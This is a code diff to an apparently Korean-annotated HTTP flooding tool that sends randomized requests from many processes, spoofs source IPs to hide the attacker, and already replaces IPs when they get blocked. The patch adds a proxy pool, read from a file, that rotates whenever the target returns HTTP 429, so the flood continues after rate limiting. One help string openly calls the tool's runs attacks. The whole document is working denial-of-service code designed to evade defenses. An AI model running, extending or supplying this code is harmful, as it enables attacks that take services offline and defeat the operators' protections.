@@ -37,6 +37,10 @@ _ROTATE_INTERVAL = [5.0]  # IP rotation interval in seconds
 _SPOOF_MODE = [False]  # True = stealth mode (use spoofed IPs, hide real IP)
 _RECOVERY = [False]  # True = auto-replace blocked IPs
 _PROXY = [None]  # proxy URL: "http://host:port" or "socks5://user:pass@host:port"
+_PROXY_POOL = []  # type: ignore  # List of proxy URLs (e.g., ["http://proxy1:8080", "http://proxy2:8080"])
+_PROXY_IDX = [0]  # Current proxy index in pool (rotates on 429)
+_PROXY_BLOCKED = set()  # type: ignore  # Set of blocked proxy URLs
+_PROXY_STATS = {}  # type: ignore  # proxy_url -> {'requests': 0, '429': 0, 'errors': 0}
 
 def _parse_proxy(proxy_url):
     """프록시 URL을 (스키미, 호스트, 포트, 사용자, 패스워드)로 파싱"""
@@ -50,7 +54,6 @@ def _parse_proxy(proxy_url):
         'pass': p.password,
     }
 
-    
     proxy = _parse_proxy(_PROXY[0])
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout)
@@ -93,6 +96,47 @@ def _parse_proxy(proxy_url):
             raise OSError(f"SOCKS5 connect failed: {response[1]}")
     
     return sock, proxy
+
+def _load_proxy_pool(file_path):
+    """프록시 파일 로드 (1개씩 줄). 각 줄: host:port 또는 http://host:port
+    
+    예:
+        proxy1.com:8080
+        http://proxy2.com:8080
+        socks5://user:pass@proxy3.com:1080
+    """
+    proxies = []
+    try:
+        with open(file_path, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if not line or line.startswith('#'):
+                    continue
+                # Add scheme if missing
+                if ':' in line and not line.startswith(('http://', 'https://', 'socks5://')):
+                    line = 'http://' + line
+                proxies.append(line)
+    except Exception as e:
+        print(f"[proxy] 파일 로드 실패: {e}", file=sys.stderr)
+    return proxies
+
+def _get_next_proxy():
+    """다음 프록시 반환 (429 감지 시 자동 회전).
+    
+    - _PROXY_POOL 비어있으면 None 반환 (직접 연결)
+    - 차단된 프록시는 건너뜀
+    - 모든 프록시 차단되면 첫 프록시 리셋
+    """
+    if not _PROXY_POOL:
+        return None
+    active = [p for p in _PROXY_POOL if p not in _PROXY_BLOCKED]
+    if not active:
+        # All blocked: reset and retry
+        _PROXY_BLOCKED.clear()
+        active = _PROXY_POOL[:]
+    idx = _PROXY_IDX[0] % len(active)
+    _PROXY_IDX[0] = (idx + 1) % len(active)
+    return active[idx]
 
 def _detect_local_ips():
     """로컬 IPv4 주소 전부 감지"""
@@ -1565,13 +1609,17 @@ def _random_http_req(host, path):
     return req.encode()
 
 def _mp_http_send(args_tuple):
-    """멀티프로세스 raw socket HTTP 전송 (429 감지 + IP 교체 + 프록시)"""
+    """멀티프로세스 raw socket HTTP 전송 (429 감지 + IP 교체 + 프록시 프루)"""
     import time as _time
-    if len(args_tuple) == 7:
+    if len(args_tuple) == 8:
+        host, port, path, duration, src_ip, ip_pool, proxy, proxy_pool = args_tuple
+    elif len(args_tuple) == 7:
         host, port, path, duration, src_ip, ip_pool, proxy = args_tuple
+        proxy_pool = None
     else:
         host, port, path, duration, src_ip, ip_pool = args_tuple
         proxy = None
+        proxy_pool = None
     # Pre-generate pool of 10 randomized requests (fast cycling)
     import random as _rnd
     req_pool = [_random_http_req(host, path) for _ in range(10)]
@@ -1583,6 +1631,8 @@ def _mp_http_send(args_tuple):
     blocked = 0
     s = None
     cur_ip = src_ip
+    cur_proxy = proxy  # Current proxy (tuples: (host, port))
+    proxy_idx = 0  # Proxy pool index
     end = _time.time() + duration
     while _time.time() < end:
         # Connect (or reconnect after 429/error)
@@ -1597,9 +1647,21 @@ def _mp_http_send(args_tuple):
                         s.bind((cur_ip, 0))
                     except OSError:
                         pass
-                if proxy:
+                # Determine which proxy to use
+                use_proxy = None
+                if proxy_pool and len(proxy_pool) > 0:
+                    # v5.0: Proxy pool mode - rotate on 429
+                    use_proxy = proxy_pool[proxy_idx % len(proxy_pool)]
+                elif cur_proxy:
+                    use_proxy = cur_proxy
+                if use_proxy:
                     # Connect through proxy (HTTP CONNECT tunnel)
-                    p_host, p_port = proxy
+                    if isinstance(use_proxy, tuple):
+                        p_host, p_port = use_proxy
+                    else:
+                        from urllib.parse import urlparse as _up2
+                        p = _up2(use_proxy)
+                        p_host, p_port = p.hostname, p.port or 8080
                     s.connect((p_host, p_port))
                     connect_req = f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode()
                     s.sendall(connect_req)
@@ -1630,15 +1692,21 @@ def _mp_http_send(args_tuple):
             if not data:
                 break
             sent += 1
-            # 429 detection: this IP is blocked, switch to next
-            if _RECOVERY[0] and ip_pool and data[:12].startswith(b'HTTP/1.1 429'):
-                if cur_ip:
-                    _BLOCKED_IPS.add(cur_ip)
-                    blocked += 1
-                active = [ip for ip in ip_pool if ip not in _BLOCKED_IPS]
-                if not active:
-                    break
-                cur_ip = active[0]
+            # 429 detection: this IP/proxy is blocked, switch to next
+            if _RECOVERY[0] and data[:12].startswith(b'HTTP/1.1 429'):
+                blocked += 1
+                # Rotate IP if IP pool available
+                if ip_pool:
+                    if cur_ip:
+                        _BLOCKED_IPS.add(cur_ip)
+                    active = [ip for ip in ip_pool if ip not in _BLOCKED_IPS]
+                    if not active:
+                        _BLOCKED_IPS.clear()
+                        active = ip_pool[:]
+                    cur_ip = active[0]
+                # Rotate proxy if proxy pool available (v5.0)
+                if proxy_pool and len(proxy_pool) > 0:
+                    proxy_idx += 1
                 s.close()
                 s = None
         except Exception:
@@ -1674,8 +1742,13 @@ async def raw_worker(name, url, stats, duration, stop, payload_size=0):
     ctx = mp.get_context('spawn')
     
     # Proxy (parsed once, passed to children)
+    # v5.0: Use proxy pool if available, otherwise single proxy
     proxy = None
-    if _PROXY[0]:
+    proxy_pool = _PROXY_POOL  # type: ignore
+    if proxy_pool:
+        # Proxy pool mode: each process gets a different proxy (round-robin)
+        pass  # proxy_pool is passed separately
+    elif _PROXY[0]:
         try:
             from urllib.parse import urlparse as _up
             _pp = _up(_PROXY[0])
@@ -1683,15 +1756,29 @@ async def raw_worker(name, url, stats, duration, stop, payload_size=0):
         except Exception:
             proxy = None
     
-    if _SPOOF_MODE[0] and _SRC_IPS[0]:
+    if proxy_pool:
+        # v5.0: Proxy pool mode - each process gets a different proxy
+        from urllib.parse import urlparse as _up
+        targets = []
+        for i in range(n_procs):
+            # Round-robin proxy assignment
+            p_idx = i % len(proxy_pool)
+            try:
+                p = _up(proxy_pool[p_idx])
+                p_tuple = (p.hostname, p.port or 8080)
+            except Exception:
+                p_tuple = None
+            src_ip = _get_src_ip(i, n_procs) if (_SPOOF_MODE[0] and _SRC_IPS[0]) else None
+            targets.append((host, port, path, duration, src_ip, None, p_tuple, proxy_pool))
+    elif _SPOOF_MODE[0] and _SRC_IPS[0]:
         # Spoofing + recovery mode: each process gets a different src IP
         ip_pool = list(_SRC_IPS[0])  # Pass full pool so recovery can pick next IP
         targets = []
         for i in range(n_procs):
             src_ip = _get_src_ip(i, n_procs)
-            targets.append((host, port, path, duration, src_ip, ip_pool, proxy))
+            targets.append((host, port, path, duration, src_ip, ip_pool, proxy, None))
     else:
-        targets = [(host, port, path, duration, None, None, proxy)] * n_procs
+        targets = [(host, port, path, duration, None, None, proxy, None)] * n_procs
     
     pool = ctx.Pool(n_procs)
     async_result = pool.map_async(_mp_http_send, targets)
@@ -2490,6 +2577,8 @@ examples:
         help="소스 IP 파일 (1개씩 줄, 또는 프록시 풀 host:port)")
     ap.add_argument("--proxy", default=None, metavar="URL",
         help="프록시 URL: http://host:port 또는 socks5://user:pass@host:port. 전체 트래픽 프록시 경유")
+    ap.add_argument("--proxy-file", default=None, metavar="FILE",
+        help="프록시 풀 파일 (1개씩 줄: host:port 또는 http://host:port). 429 감지 시 자동 프록시 교체")
     ap.add_argument("--dry-run", action="store_true",
         help="시뮬레이션: 대상 탐지, 예측 RPS/IP 수 표시, 공격 안 함")
     args = ap.parse_args()
@@ -2554,6 +2643,14 @@ examples:
     if args.proxy:
         _PROXY[0] = args.proxy
         print(f"[proxy] routing through {args.proxy}", file=sys.stderr)
+    
+    # Initialize proxy pool (v5.0)
+    if args.proxy_file:
+        _PROXY_POOL = _load_proxy_pool(args.proxy_file)
+        print(f"[proxy-pool] loaded {len(_PROXY_POOL)} proxies from {args.proxy_file}", file=sys.stderr)
+        if len(_PROXY_POOL) > 0:
+            print(f"[proxy-pool] first: {_PROXY_POOL[0]}, last: {_PROXY_POOL[-1]}", file=sys.stderr)
+        _RECOVERY[0] = True  # Proxy pool implies auto-recovery
     
     # Initialize source IP rotation / spoofing
     _RECOVERY[0] = args.recovery
